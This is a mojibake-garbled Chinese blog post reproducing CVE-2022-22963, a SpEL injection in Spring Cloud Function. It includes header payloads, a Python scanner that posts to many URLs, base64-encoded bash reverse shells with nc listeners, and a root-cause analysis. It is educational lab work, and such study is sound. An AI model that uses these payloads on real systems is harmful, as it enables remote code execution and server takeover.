çš„å‡½æ•°è®¡ç®—æ¡†æ¶ã€‚è¯¥é¡¹ç›®è‡´åŠ›äºä¿ƒè¿›å‡½æ•°ä¸ºä¸»çš„å¼€å‘å•å…ƒï¼Œå®ƒæŠ½è±¡å‡ºæ‰€æœ‰ä¼ è¾“ç»†èŠ‚å’ŒåŸºç¡€æ¶æ„ï¼Œå¹¶æä¾›ä¸€ä¸ªé€šç”¨çš„æ¨¡å‹ï¼Œç”¨äºåœ¨å„ç§å¹³å°ä¸Šéƒ¨ç½²åŸºäºå‡½æ•°çš„è½¯ä»¶ã€‚ ç”±äºSpring Cloud Functionå­˜åœ¨SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ã€‚è¿œç¨‹æ”»å‡»è€…æ— éœ€è®¤è¯å³å¯æ„é€ ç‰¹å®šçš„æ•°æ®åŒ…ï¼Œå¹¶é€šè¿‡ç‰¹å®šçš„ HTTP è¯·æ±‚å¤´æ³¨å…¥ SpEL è¡¨è¾¾å¼ã€‚æœ€ç»ˆå¯å¯¼è‡´è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ï¼Œè·å–æœåŠ¡å™¨æƒé™ã€‚ é£é™©ç­‰çº§ï¼šé«˜é£é™© æ¼æ´é£é™©ï¼šæ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å¯å¯¼è‡´è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ï¼Œè·å–æœåŠ¡å™¨æƒé™ å½±å“ç‰ˆæœ¬ Spring Cloud Function =\u0026lt; 3.1.6 Spring Cloud Function =\u0026lt; 3.2.2 å®‰å…¨ç‰ˆæœ¬ Spring Cloud Function \u0026gt;= 3.1.7 Spring Cloud Function \u0026gt;= 3.2.3 SpringCloud Functionä»‹ç» SpringCloud æ˜¯ä¸€å¥—åˆ†å¸ƒå¼ç³»ç»Ÿçš„è§£å†³æ–¹æ¡ˆï¼Œå¸¸è§çš„è¿˜æœ‰é˜¿é‡Œå·´å·´çš„Dubboï¼ŒFassï¼ˆFunction As A Service ï¼‰çš„åº•å±‚å®ç°å°±æ˜¯å‡½æ•°å¼ç¼–ç¨‹ï¼Œåœ¨è§†é¢‘è½¬ç ã€éŸ³è§†é¢‘è½¬æ¢ã€æ•°æ®ä»“åº“ETLç­‰ä¸çŠ¶æ€ç›¸å…³åº¦ä½çš„é¢†åŸŸè¿ç”¨çš„æ¯”è¾ƒå¤šã€‚å¼€å‘è€…æ— éœ€å…³æ³¨æœåŠ¡å™¨ç¯å¢ƒè¿ç»´ç­‰é—®é¢˜ä¸Šï¼Œä¸“æ³¨äºè‡ªèº«ä¸šåŠ¡é€»è¾‘å®ç°å³å¯ã€‚ SpringCloud Function å°±æ˜¯Springæä¾›çš„åˆ†å¸ƒå¼å‡½æ•°å¼ç¼–ç¨‹ç»„ä»¶ã€‚ æ¼æ´ç¯å¢ƒæ­å»º é€šè¿‡ideaæ–°å»ºä¸€ä¸ªSpringé¡¹ç›®ï¼Œpomä¸­å¼•å…¥spring-boot-starter-webã€spring-cloud-function-webï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;io.spring.sample\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;function-sample-pojo\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1.RELEASE\u0026lt;/version\u0026gt; \u0026lt;packaging\u0026gt;jar\u0026lt;/packaging\u0026gt; \u0026lt;name\u0026gt;function-sample-pojo\u0026lt;/name\u0026gt; \u0026lt;description\u0026gt;Spring Cloud Function Web Support\u0026lt;/description\u0026gt; \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-parent\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.0-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;relativePath/\u0026gt; \u0026lt;/parent\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;spring-cloud-function.version\u0026gt;3.2.1-SNAPSHOT\u0026lt;/spring-cloud-function.version\u0026gt; \u0026lt;wrapper.version\u0026gt;1.0.27.RELEASE\u0026lt;/wrapper.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-function-webflux\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-configuration-processor\u0026lt;/artifactId\u0026gt; \u0026lt;optional\u0026gt;true\u0026lt;/optional\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;dependencyManagement\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-function-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${spring-cloud-function.version}\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/dependencyManagement\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-deploy-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;skip\u0026gt;true\u0026lt;/skip\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot.experimental\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-thin-layout\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${wrapper.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;artifactId\u0026gt;maven-surefire-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;includes\u0026gt; \u0026lt;include\u0026gt;**/*Tests.java\u0026lt;/include\u0026gt; \u0026lt;include\u0026gt;**/*Test.java\u0026lt;/include\u0026gt; \u0026lt;/includes\u0026gt; \u0026lt;excludes\u0026gt; \u0026lt;exclude\u0026gt;**/Abstract*.java\u0026lt;/exclude\u0026gt; \u0026lt;/excludes\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;repositories\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;spring-snapshots\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Snapshots\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-snapshot-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;releases\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/releases\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;spring-milestones\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Milestones\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-milestone-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;spring-releases\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Releases\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/release\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;/repositories\u0026gt; \u0026lt;pluginRepositories\u0026gt; \u0026lt;pluginRepository\u0026gt; \u0026lt;id\u0026gt;spring-snapshots\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Snapshots\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-snapshot-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;releases\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/releases\u0026gt; \u0026lt;/pluginRepository\u0026gt; \u0026lt;pluginRepository\u0026gt; \u0026lt;id\u0026gt;spring-milestones\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Milestones\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-milestone-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/pluginRepository\u0026gt; \u0026lt;pluginRepository\u0026gt; \u0026lt;id\u0026gt;spring-releases\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Releases\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-release-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/pluginRepository\u0026gt; \u0026lt;/pluginRepositories\u0026gt; \u0026lt;/project\u0026gt; å»ºç«‹ä¸€ä¸ªé…ç½®ç±»ï¼Œç”¨äºå®ç°å­—ç¬¦ä¸²å°å†™\nåœ¨applications.propertiesä¸­å†™å…¥spring.cloud.function.definition:functionRouter\nå¦‚æœè®¾ç½®ä¸ºfunctionRouteråˆ™é»˜è®¤è·¯ç”±ç»‘å®šçš„å…·ä½“å‡½æ•°äº¤ç”±ç”¨æˆ·è¿›è¡Œæ§åˆ¶ï¼Œåœ¨ Spring Cloud Function Webé‡Œé¢ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®httpå¤´çš„æ–¹å¼æ¥æ§åˆ¶ï¼Œä½¿ç”¨spring.cloud.function.definition å’Œspring.cloud.function.routing-expression éƒ½å¯ä»¥ï¼ŒåŒºåˆ«æ˜¯åè€…å…è®¸ä½¿ç”¨Springè¡¨è¾¾å¼è¯­è¨€ï¼ˆSpELï¼‰ã€‚ å¼€å¯8090ç«¯å£\næ¼æ´å¤ç° åœ¨HTTPè¯·æ±‚å¤´åŠ å…¥spring.cloud.function.routing-expression:\npayload:spring.cloud.function.routing-expression: new ProcessBuilder('/System/Applications/Calculator.app/Contents/MacOS/Calculator').start()\nåŒæ—¶ä¹Ÿå¯ä»¥é€šè¿‡T(java.lang.Runtime).getRuntime().exec(\u0026quot;cmd\u0026quot;)æ¥æ‰§è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œ\nä½†æ˜¯è¿™ç§å‘½ä»¤æ‰§è¡Œæ²¡æœ‰å›æ˜¾ã€‚ expè„šæœ¬\nexpå®é™…ä¸Šå°±æ˜¯å°è£…å¥½æˆ‘ä»¬æˆ‘ä»¬éœ€è¦å‘é€çš„æ•°æ®åŒ…ï¼Œå¸¦ä¸Šæˆ‘ä»¬çš„æ¶æ„å‚æ•°å¤´ã€‚ å®é™…ä¸Šï¼Œè¿™ä¸ªexpä¹Ÿå¯ä»¥æ‰§è¡Œå…¶ä»–å‘½ä»¤ï¼Œåªéœ€è¦æ›´æ”¹å‘é€æ•°æ®åŒ…çš„payloadå³å¯ï¼Œä¸‹é¢çš„åå¼¹shellå°±ä¼šç”¨åˆ°è¯¥è„šæœ¬ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 import requests import sys import threading import urllib3 urllib3.disable_warnings() def scan(txt,cmd): # payload1=f\u0026#39;T(java.lang.Runtime).getRuntime().exec(\u0026#34;{cmd}\u0026#34;)\u0026#39; payload = \u0026#34;new ProcessBuilder(\u0026#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#39;).start()\u0026#34; data =\u0026#39;test\u0026#39; headers = { \u0026#39;spring.cloud.function.routing-expression\u0026#39;:payload, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;*/*\u0026#39;, \u0026#39;Accept-Language\u0026#39;: \u0026#39;en\u0026#39;, \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; } path = \u0026#39;/functionRouter\u0026#39; f = open(txt) urllist=f.readlines() for url in urllist : url = url.strip(\u0026#39;\\n\u0026#39;) all = url + path try: req=requests.post(url=all,headers=headers,data=data,verify=False,timeout=3) code =req.status_code text = req.text rsp = \u0026#39;\u0026#34;error\u0026#34;:\u0026#34;Internal Server Error\u0026#34;\u0026#39; if code == 500 and rsp in text: print ( f\u0026#39;[+] { url } is vulnerable\u0026#39; ) poc_file = open(\u0026#39;vulnerable.txt\u0026#39;, \u0026#39;a+\u0026#39;) poc_file.write(url + \u0026#39;\\n\u0026#39;) poc_file.close() else: print ( f\u0026#39;[-] { url } not vulnerable\u0026#39; ) except requests.exceptions.RequestException: print ( f\u0026#39;[-] { url } detection timed out\u0026#39; ) continue except: print ( f\u0026#39;[-] { url } error\u0026#39; ) continue if __name__ == \u0026#39;__main__\u0026#39; : try: cmd1 =sys.argv[1] t = threading . Thread ( target = scan ( cmd1 , \u0026#39;whoami\u0026#39; ) ) t.start() except: print ( \u0026#39;Usage:\u0026#39; ) print(\u0026#39;python poc.py url.txt\u0026#39;) è¿™é‡Œæˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬éœ€è¦è¿›è¡Œcveæ‰§è¡Œçš„ipéƒ½å­˜æ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹(æ¯”å¦‚ip.txt)é‡Œé¢ æ‰§è¡Œçš„æ—¶å€™è°ƒç”¨python3 exp.py ip.txtå³å¯ åå¼¹shell æˆ‘ä»¬å¯ä»¥é€šè¿‡åå¼¹shellæ‹¿åˆ°ç¨³å®šçš„shell æœ¬åœ°å®ç° è¿™é‡Œæ˜¯é€šè¿‡æœ¬æœºçš„ä¸¤ä¸ªç«¯å£å®ç°ã€‚\nå‘½ä»¤å‡†å¤‡\n1 2 3 4 åå¼¹shellå‘½ä»¤ï¼š bash -i \u0026gt;\u0026amp; /dev/tcp/127.0.0.1/8899 0\u0026gt;\u0026amp;1 base64åŠ å¯†ï¼š bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg5OSAwPiYx}|{base64,-d}|{bash,-i} ä¿®æ”¹æ•°æ®åŒ…åï¼Œå‘é€æ•°æ®åŒ…ï¼š\nåŒæ—¶åœ¨æœ¬æœºç”¨nc -l 8899 ç›‘å¬8899å‘é€æ¥çš„ä¿¡æ¯ã€‚\næ•°æ®åŒ…å‘é€å®Œæ¯•ä¹‹å ç”±æ­¤æ‹¿åˆ°ç¨³å®šçš„shell https://blog.csdn.net/xhwfa/article/details/124307153 ä¸¤ä¸ªè™šæ‹Ÿæœºå®ç° é¶æœºï¼šubuntu 18 : IP:192.168.195.133\næ”»å‡»æœº:kali linux : IP:192.168.195.131\nåœ¨æ”»å‡»æœºå¼€å¯nc -lvvp 8899å¯¹8899ç«¯å£è¿›è¡Œç›‘å¬\nåŒæ—¶æ”»å‡»æœºå¯¹expè„šæœ¬è¿›è¡Œè¿è¡Œ\næ‹¿åˆ°shell\nexpè„šæœ¬ï¼š\nå³ä¸ºå°†ä¸Šé¢çš„é€šç”¨è„šæœ¬é‡Œé¢çš„payloadæ”¹å†™ä¸€ä¸‹å³å¯\n1 payload = \u0026#39;T(java.lang.Runtime).getRuntime().exec(\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjczLjEzMS84ODk5IDA+JjE=}|{base64,-d}|{bash,-i}\u0026#34;)\u0026#39; åŸç†åˆ†æ æ ¹æ®æ¼æ´åŸç†åŠå®˜æ–¹æµ‹è¯•ç”¨ä¾‹å¯ä»¥çŸ¥æ™“æ¼æ´è§¦å‘ç‚¹åœ¨http headerä¸­spring.cloud.function.routing-expressionå­—æ®µã€‚\nåœ¨å‘½ä»¤æ‰§è¡Œå‡ºä¸‹æ–­ç‚¹ï¼Œçœ‹ä¸‹ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚\nSpringCloud Functionä¹‹æ‰€ä»¥èƒ½è‡ªåŠ¨å°†å‡½æ•°å»ºç«‹httpç«¯ç‚¹ï¼Œæ˜¯å› ä¸ºåœ¨åŒ…mvc.FunctionControllerä¸­ä½¿ç”¨/** ç›‘å¬äº†get/postç±»å‹çš„æ‰€æœ‰ç«¯ç‚¹ã€‚\n1ã€å½“ä¸€ä¸ªè¯·æ±‚è¿›å…¥æ—¶ï¼Œç¨‹åºé¦–å…ˆåŸºäºSpringbootçš„è‡ªåŠ¨é…ç½®ï¼Œè°ƒç”¨å¤„ç†å™¨ï¼Œéšåå°†ä»¥â€œWebRequestConstants.handlerâ€ä¸ºkeyï¼Œfunctionä¸ºå€¼æ·»åŠ åˆ°requestæ•°ç»„é‡Œé¢ã€‚\n2ã€æ ¹æ®ä¸Šè¿°åˆ†æï¼Œæˆ‘ä»¬å‘ç°å¯¹æ•°æ®åŒ…å°è£…å¥½ä¹‹åï¼Œæˆ‘ä»¬éƒ½éœ€è¦è°ƒç”¨å‡½æ•°processRequestï¼Œæˆ‘ä»¬ç›´æ¥åœ¨processRequestæ‰“æ–­ç‚¹\nå¯ä»¥å‘ç°wrapperå°è£…çš„å³ä¸ºæˆ‘ä»¬çš„HTTPå¤´ åŒæ—¶æŸ¥çœ‹å‚æ•°function,å‘ç°å…¶functionDefinitionä¸ºfunctionRouter å¦‚æœè®¾ç½®ä¸ºfunctionRouteråˆ™é»˜è®¤è·¯ç”±ç»‘å®šçš„å…·ä½“å‡½æ•°äº¤ç”±ç”¨æˆ·è¿›è¡Œæ§åˆ¶ï¼Œåœ¨ Spring Cloud Function Webé‡Œé¢ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®httpå¤´çš„æ–¹å¼æ¥æ§åˆ¶ï¼Œä½¿ç”¨spring.cloud.function.definition å’Œspring.cloud.function.routing-expression éƒ½å¯ä»¥ï¼ŒåŒºåˆ«æ˜¯åè€…å…è®¸ä½¿ç”¨Springè¡¨è¾¾å¼è¯­è¨€ï¼ˆSpELï¼‰ã€‚ 3ã€é€šè¿‡åˆ¤æ–­åæ‰§è¡Œfunctionçš„applyæ–¹æ³•\nç„¶ååœ¨applyä¸­æ‰§è¡Œdoaplyæ–¹æ³•\n4ã€åˆ¤æ–­æ˜¯ä¸æ˜¯functionRouteræ–¹æ³•ï¼Œåˆ¤æ–­å½“å‰çš„ç±»å‹ï¼Œæ˜¯RouteFunctionæˆ–è€…Composedç›´æ¥è·³è½¬åˆ°elseï¼Œæ‰§è¡Œè‡ªå·±çš„applyæ–¹æ³•ï¼Œè¿™é‡Œæ˜¯functionRouterï¼Œæˆ‘ä»¬ç›´æ¥å°±æ‰§è¡ŒfuntionRouterçš„applyæ–¹æ³•\nå‘ç°åœ¨functionRouterçš„applyæ–¹æ³•ä¸­å®é™…ä¸Šè°ƒç”¨çš„æ˜¯routeæ–¹æ³• 5ã€åˆ†ærouteæ–¹æ³•\nå› ä¸ºfunctionä¸ºnull,ç›´æ¥è¿›å…¥if-else\nå¯ä»¥çœ‹åˆ°ç¨‹åºæ£€æŸ¥headerså‚æ•°ä¸­æ˜¯å¦æœ‰â€œspring.cloud.function.definitionâ€æˆ–è€…â€œspring.cloud.function.routing-expressionâ€œå­—æ®µï¼Œå¹¶è¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚å¦‚æœæ˜¯spring.cloud.function.routing-expression ï¼Œåˆ™è°ƒç”¨ functionFromExpression()æ–¹æ³•å¤„ç†ã€‚\n6ã€è·Ÿè¿›åˆ°functionFromExpressionæ–¹æ³•ä¸­ï¼Œå‚æ•°ä¸­routingExpressionï¼Œå¯ä»¥çœ‹ä¸€ä¸‹è¯¥å‚æ•°ä¸ºT(java.lang.Runtime).getRuntime().exec(\u0026quot;whoami\u0026quot;)ï¼Œä¹Ÿå°±æ˜¯headerä¸­ä¼ å…¥çš„ã€‚ä¼ å…¥åç”±spelParser.parseExpressionï¼ˆï¼‰å¤„ç†ã€‚\n7ã€æ¼æ´ä¹Ÿå°±æ˜¯åœ¨è¿™é‡ŒSpELè¡¨è¾¾å¼è§£æï¼Œè¿›è¡Œè§¦å‘ã€‚\n","permalink":"http://www.reus09.top/posts/tech/cve-2022-22963/","summary":"æ¼æ´ä»‹ç» Spring Cloud Function æ˜¯åŸºäº Spring Boot çš„å‡½æ•°è®¡ç®—æ¡†æ¶ã€‚è¯¥é¡¹ç›®è‡´åŠ›äºä¿ƒè¿›å‡½æ•°ä¸ºä¸»çš„å¼€å‘å•å…ƒï¼Œå®ƒæŠ½è±¡å‡ºæ‰€æœ‰ä¼ è¾“ç»†èŠ‚å’ŒåŸºç¡€æ¶æ„ï¼Œå¹¶æä¾›ä¸€ä¸ªé€šç”¨çš„æ¨¡å‹ï¼Œç”¨äºåœ¨å„ç§","title":"CVE-2022-22963æ¼æ´å¤ç°"},{"content":" å› ä¸ºä¹‹å‰æ¥è§¦äº†ä¸€ç‚¹ssmï¼Œæ‰€ä»¥è¿™é‡Œç®€å•çš„å­¦ä¹ äº†springbootçš„ä¸€äº›ç®€å•ç”¨æ³•ï¼Œå…·ä½“çš„æºç åˆ†æä»¥åæœ‰æ—¶é—´çš„è¯æ…¢æ…¢åˆ†æ è¿™é‡Œç®€å•è°ˆä¸€ä¸‹springbootçš„ç®€å•äº†è§£ï¼Œspringbootå®é™…ä¸Šæ˜¯æŠŠssmã€webæœåŠ¡å™¨æ¯”å¦‚tomcat,jettyã€mysqlæˆ–è€…nosqlå„ä¸ªæ¡†æ¶æ•´åˆåˆ°ä¸€èµ·çš„äº§ç‰©ï¼Œä½¿ç”¨springbootå®é™…ä¸Šç®€åŒ–äº†å„ä¸ªæ¡†æ¶çš„ç»„åˆä½¿ç”¨ã€‚ springbootä¸­åŠ è½½æ”¯æŒçš„é…ç½®çš„ä¾èµ–ä¸€èˆ¬ä»¥springboot-starter-xxx éå®˜æ–¹æ”¯æŒçš„ç¬¬ä¸‰æ–¹ä¾èµ–å‘½åï¼šxxx-springboot-starter-xxx SpringBooté»˜è®¤ä¼šåœ¨åº•å±‚é…å¥½æ‰€æœ‰çš„ç»„ä»¶ã€‚ä½†æ˜¯å¦‚æœç”¨æˆ·è‡ªå·±é…ç½®äº†ä»¥ç”¨æˆ·çš„ä¼˜å…ˆ å­¦ä¹ å¯ä»¥é€šè¿‡springbootæä¾›çš„å®˜æ–¹æ–‡æ¡£ è¿™é‡Œç»™å‡º2.5.13ç‰ˆæœ¬çš„å®˜æ–¹æ–‡æ¡£é“¾æ¥ https://docs.spring.io/spring-boot/docs/2.5.13/reference/html/ 1 é…ç½®ä½¿ç”¨ application.propertieså’Œapplication.yaml 2 æ³¨è§£ä½¿ç”¨ å› ä¸ºspringbooté›†æˆäº†springmvcå’Œspringï¼Œä¹Ÿç»„åˆäº†å…¶è®¸å¤šçš„æ³¨è§£ @SpringBootApplication 1 2 3 4 5 @SpringBootApplication ç­‰åŒäº @SpringBootConfiguration @EnableAutoConfiguration @ComponentScan(\u0026#34;com.reus.boot\u0026#34;) @SpringBootConfiguration @Configurationã€‚ä»£è¡¨å½“å‰æ˜¯ä¸€ä¸ªé…ç½®ç±» @EnableAutoConfiguration 1 2 3 @AutoConfigurationPackage @Import(AutoConfigurationImportSelector.class) public @interface EnableAutoConfiguration {} @EnableAutoConfigurationé›†æˆäº†ä¸¤ä¸ªæ³¨è§£\n@AutoConfigurationPackage\nè‡ªåŠ¨é…ç½®åŒ…,æŒ‡å®šäº†é»˜è®¤çš„åŒ…è§„åˆ™\n1 2 3 4 5 @Import(AutoConfigurationPackages.Registrar.class) //ç»™å®¹å™¨ä¸­å¯¼å…¥ä¸€ä¸ªç»„ä»¶ public @interface AutoConfigurationPackage {} //åˆ©ç”¨Registrarç»™å®¹å™¨ä¸­å¯¼å…¥ä¸€ç³»åˆ—ç»„ä»¶ //å°†æŒ‡å®šçš„ä¸€ä¸ªåŒ…ä¸‹çš„æ‰€æœ‰ç»„ä»¶å¯¼å…¥è¿›æ¥ï¼ŸMainApplication æ‰€åœ¨åŒ…ä¸‹ã€‚ å®é™…ä¸Šå°†æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„åœ¨é»˜è®¤åŒ…ä¸­çš„ç»„ä»¶åŠ å…¥åˆ°å®¹å™¨ä¸­\n@Import(AutoConfigurationImportSelector.class)\n1 2 3 4 5 6 1ã€åˆ©ç”¨getAutoConfigurationEntry(annotationMetadata);ç»™å®¹å™¨ä¸­æ‰¹é‡å¯¼å…¥ä¸€äº›ç»„ä»¶ 2ã€è°ƒç”¨List\u0026lt;String\u0026gt; configurations = getCandidateConfigurations(annotationMetadata, attributes)è·å–åˆ°æ‰€æœ‰éœ€è¦å¯¼å…¥åˆ°å®¹å™¨ä¸­çš„é…ç½®ç±» 3ã€åˆ©ç”¨å·¥å‚åŠ è½½ Map\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; loadSpringFactories(@Nullable ClassLoader classLoader)ï¼›å¾—åˆ°æ‰€æœ‰çš„ç»„ä»¶ 4ã€ä»META-INF/spring.factoriesä½ç½®æ¥åŠ è½½ä¸€ä¸ªæ–‡ä»¶ã€‚ é»˜è®¤æ‰«ææˆ‘ä»¬å½“å‰ç³»ç»Ÿé‡Œé¢æ‰€æœ‰META-INF/spring.factoriesä½ç½®çš„æ–‡ä»¶ spring-boot-autoconfigure-2.3.4.RELEASE.jaråŒ…é‡Œé¢ä¹Ÿæœ‰META-INF/spring.factories è¿™é‡Œæ˜¯åŠ è½½springbootç»™æˆ‘ä»¬æä¾›çš„è¯¥é¡¹ç›®éœ€è¦ç»‘å®šçš„é»˜è®¤ç»„ä»¶ã€‚ @ComponentScan(\u0026quot;com.reus.boot\u0026quot;) æŒ‡å®šæ‰«æå“ªäº›ï¼ŒSpringæ³¨è§£ï¼›æŒ‡å®šæ‰«æé‚£äº›åŒ… @Configuration å‘Šè¯‰å®¹å™¨è¿™æ˜¯ä¸€ä¸ªé…ç½®ç±»\nåŸºæœ¬ä½¿ç”¨ Fullæ¨¡å¼ä¸Liteæ¨¡å¼ ç¤ºä¾‹ æœ€ä½³å®æˆ˜ é…ç½® ç±»ç»„ä»¶ä¹‹é—´æ— ä¾èµ–å…³ç³»ç”¨Liteæ¨¡å¼åŠ é€Ÿå®¹å™¨å¯åŠ¨è¿‡ç¨‹ï¼Œå‡å°‘åˆ¤æ–­ 